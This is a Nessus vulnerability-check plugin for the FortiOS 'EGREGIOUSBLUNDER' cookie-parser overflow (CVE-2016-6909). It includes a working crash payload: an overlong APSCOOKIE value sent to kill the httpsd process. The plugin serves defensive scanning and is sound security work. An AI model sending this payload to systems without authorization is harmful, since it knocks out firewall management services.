#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(93196);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2016/12/08 20:31:54 $");

  script_cve_id("CVE-2016-6909");
  script_bugtraq_id(92523);
  script_osvdb_id(143063);
  script_xref(name:"EDB-ID", value:"40276");

  script_name(english:"Fortinet FortiOS Web Interface Cookie Parser RCE (EGREGIOUSBLUNDER)");
  script_summary(english:"Tries to terminate the remote httpsd.");

  script_set_attribute(attribute:"synopsis", value:
"A web-based management console running on the remote host is affected
by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Fortinet FortiOS management console running on the remote host
is affected by a remote code execution vulnerability, known as
EGREGIOUSBLUNDER, in its web interface due to improper validation when
parsing cookies. An unauthenticated, remote attacker can exploit this,
via a specially crafted HTTP request, to cause a buffer overflow
condition, resulting in a denial of service condition or the execution
of arbitrary code.

EGREGIOUSBLUNDER is one of multiple Equation Group vulnerabilities and
exploits disclosed on 2016/08/14 by a group known as the Shadow
Brokers.

Note that this plugin attempts to kill the httpsd process, which
appears to restart after termination. Additionally, this plugin
requires report paranoia as it relies on a missing server response to
indicate a vulnerable status, which may or may not be reliable.");
  script_set_attribute(attribute:"see_also", value:"http://fortiguard.com/advisory/FG-IR-16-023");
  # https://www.riskbasedsecurity.com/2016/08/the-shadow-brokers-lifting-the-shadows-of-the-nsas-equation-group/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?4c7e0cf3");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Fortinet FortiOS 4.1.11 / 4.2.13 / 4.3.9 / 5.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/08/14");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/08/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/08/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:fortinet:fortios");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("fortigate_detect.nasl");
  script_require_keys("www/fortios_ui", "Settings/ParanoidReport");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

# Use lack of response to flag vulnerability is not so reliable
if (report_paranoia < 2) audit(AUDIT_PARANOID);

# FortiOS web gui not detected
get_kb_item_or_exit("www/fortios_ui");

port = get_http_port(default:443, embedded: TRUE);

# Do https only
if(get_port_transport(port) == ENCAPS_IP)
  exit(0, "Not testing non-https port " + port + ".");

app_name = "FortiOS Web Interface";
install = get_install_from_kb(appname:'fortios_ui', port:port, exit_on_fail:TRUE);
dir = install['dir'];
report_url = build_url(port:port, qs:dir);


#
# Request 1: Get the cookie name to use 
#
res = http_send_recv3(
  method:'GET',
  item:'/login',
  port:port,
  exit_on_fail:TRUE
  );

matches = eregmatch(string: res[1], pattern:"(APSCOOKIE.*?)=");
if(matches)
{
  cookie_name = matches[1];
}
else
{
  exit(1, "Failed to get APSCOOKIE name.");
}

url = "/index";

#
# Request 2: Test with a cookie having a valid length
#
cookie_good = cookie_name + 
'=Era=0&Payload=' +
crap(data:'A', length: 0x1000);

res = http_send_recv3(
  method:'POST',
  item:url,
  port:port,
  add_headers: make_array("Cookie", cookie_good),
  exit_on_fail: TRUE 
  );

#
# Request 3: Attempt to kill httpsd
#
cookie_bad = cookie_name + 
'=Era=0&Payload=' +
crap(data:'A', length: 0x1100); 

res = http_send_recv3(
  method:'POST',
  item:url,
  port:port,
  add_headers: make_array("Cookie", cookie_bad)
  );

req = http_last_sent_request();

if(res[2])
{
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app_name, report_url);
}
else
{
  security_report_v4(port:    port, 
                    severity: SECURITY_HOLE, 
                    generic:  TRUE,
                    request:  make_list(req)
                    );
}
